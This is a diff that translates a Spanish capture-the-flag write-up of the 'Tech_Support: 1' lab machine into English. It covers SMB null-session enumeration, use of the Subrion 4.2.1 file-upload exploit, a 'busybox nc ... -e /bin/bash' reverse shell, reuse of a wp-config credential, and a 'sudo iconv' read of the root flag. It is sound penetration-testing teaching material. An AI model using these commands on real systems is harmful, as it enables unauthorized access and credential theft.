@@ -1,16 +1,18 @@
-# Máquina Tech_Support: 1
-### Descripcion:
-- Dificultad: Easy
-- S.O: Linux
-### Conectividad
+# Tech_Support: 1
 
-Primero de todo hacemos un ping a la máquina para ver si tenemos conectividad y gracias al ttl vemos que es una maquina linux
+### Description:
+
+- Difficulty: Easy
+- O.S: Linux
+### Connectivity
+
+To start this machine I pinged the machine to check the connection and thanks to ttl it's a linux machine.
 
 ![Ping](Img/ping.png)
 
-### Ennumeración de puertos
+### Port enumeration
 
-Ahora vamos a realizar los escaneos de nmap para ver los puertos abiertos y servicios que corren en esta máquina
+Now we scan with nmap to see which ports and which services are running in this machine.
 
 ```bash
 nmap <IP> -p- -sS --min-rate 5000 -Pn -n -vvv -oG allports
@@ -24,16 +26,16 @@ nmap <IP> -p22,80,139,445 -sCV -oN targeted
 
 ![Targeted-nmap](Img/Targeted-nmap.png)
 
-Viendo los resultados de nmap vemos:
-- 22 <- ssh - No tenemos credenciales asi que de momento no vamos a hacer nada
-- 80 <- http - Página web
-- 139 & 445 <- samba - Servicio de samba por red, muy interesante
+Seeing the results:
+- 22 <- ssh - I don't have any credentials already so we can't do anything for now.
+- 80 <- http - Web page.
+- 139 & 445 <- samba - Samba service on the network, very interesting.
 
-### Enumeración Samba
+### Samba enumeration
 
-Lo primero que voy a hacer es ennumerar samba ya que puede haber información sensible de la cual me pueda aprovechar
+First of all I have enumerated samba because may have some interesting information.
 
-Con smbmap veo los recursos compartidos en el sistema y si me conecto con una null session puedo ver esto:
+With smbmap I can check the shared files on the network and if I connect with a null session I can see this:
 
 ```bash
 smbmap -H <IP>
@@ -41,7 +43,7 @@ smbmap -H <IP>
 
 ![smbmap](Img/smbmap.png)
 
-Con smbclient me conecto a websvr que es el unico recurso compartido al cual tengo acceso y me descargo la carpeta 'enter.txt' que esta dentro
+With smbclient I connect to the websvr directory because is the single directory I have access and I download the file 'enter.txt' inside.
 
 ```bash
 smbclient -N \\\\<IP>\\websvr
@@ -51,71 +53,72 @@ smbclient -N \\\\<IP>\\websvr
 get enter.txt
 ```
 
-En este archivo están las credenciales de admin para subrion
+Inside this file are the credentials for the subrion service.
 
 ![Enter](Img/enter.png)
 
-Vemos que la contraseña esta cifrada así que utilizamos cyberchef
+The password is encrypted so we can use cyberchef
 
 ![cyberchef](Img/cyberchef.png)
-### Página web
+### Web Page
 
-Ahora gracias a las credenciales que hemos descargado del samba vamos a ir a la pagina web
+Now thanks the credentials I can start seeing what's inside the web page.
 
-Vemos que la pagina web es un ubuntu default page, en el archivo vemos que tambien hace referencia a un wordpress, para ver con mas profundidad vamos a fuzzear la web con gobuster
+I can see a ubuntu default page, the next step is fuzzing the directories in the page, for this I use gobuster.
 
 ```bash
 gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
 ```
 
-El resultado de gobuster nos da el directorio /test y /wordpress los cuales me llaman la atención
+The results of gobuster show that there are the /test and /wordpress direcories.
 
 ![Gobuster](Img/gobuster.png)
 
-Por lo que hemos encontrado en el smb sabemos que tiene que haber un /subrion/panel asi que nos metemos con las credenciales que ya tenemos
+
+Thanks the file in the samba service I know that the directory /subrion/panel may exist so I enter and paste the credentials we have, now i'm logged with admin account.
 
 ![subrion](Img/subrion.png)
 
-### Explotación de CMS
+### CMS exploitation
 
-La version de subrion es la 4.2.1 y esta tiene la vulnerabilidad Arbitrary File Upload y en exploit db hay un exploit en python
+The subrion version is the 4.2.1 and that version have the Arbitrary File Upload Vulnerability, this vulnerability ends with a Remote Code Execution and there is a exploit in exploitdb that help me with that.
 
-Ejecutamos el exploit de esta manera y ya tenemos shell como www-data
+I executed the exploit in this way for gain a shell with the user www-data
 
 ![Script](Img/script.png)
 
-Como estamos en una shell bastante limitada en la cual no podemos movernos de directorio, me he hecho una reverse shell y probando me ha funcionado esta
+We are in a very limited shell that I can't move directories so I make a reverse shell and trying different ones this one works for me.
 
 ```bash
 busybox nc <IP> <PORT> -e /bin/bash
 ```
 
-Navegando un poco por los directorio he encontrado el wp-config en /var/www/html/wordpress donde contiene una credencial 
+Searching a little in the directories I have found the wp-config in /var/www/html/wordpress and there was a credential in plain text.
 
 ![wp-config](Img/wp-config.png)
 
-Al probar esta credencial con el usuario scamsite vemos que es esa la contraseña
+I tested this credential for the scamsite user and worked.
 
 ![](Img/scamsite.png)
 
-### Escalada de privilegios
+### Privilege Escalation
 
-Con el comando 'sudo -l' veo que puedo ejecutar como root el binario iconv que me permite ver archivos del sistema
+With the 'sudo -l' command I see I can execute the iconv binary with root user without password, this command let us to read system files.
 
 ![sudo -l](Img/sudo-l.png)
 
 ![](Img/gtfobins.png)
 
-Con el siguiente comando vemos la flag de root
+With the following command I can see the root flag.
 
 ```bash
 sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
 ```
 
 ![root](Img/root.png)
-### Aprendido
+### Lessons learned
 
-- Reconocimiento de samba
-- Explotacion de CMS vulnerable
-- Archivo de configuracion con contraseña en texto claro
-- Escalada de privilegios con comando ejecutado por root sin pedir contraseña
+- Samba access with null session is dangerous and often can leak sensitive data
+- Outdated CMS are a way to gain shell access
+- Config files with passwords in clear text that are often reused in other services
+- Root command without giving password are often the way to fully root compromise the machine
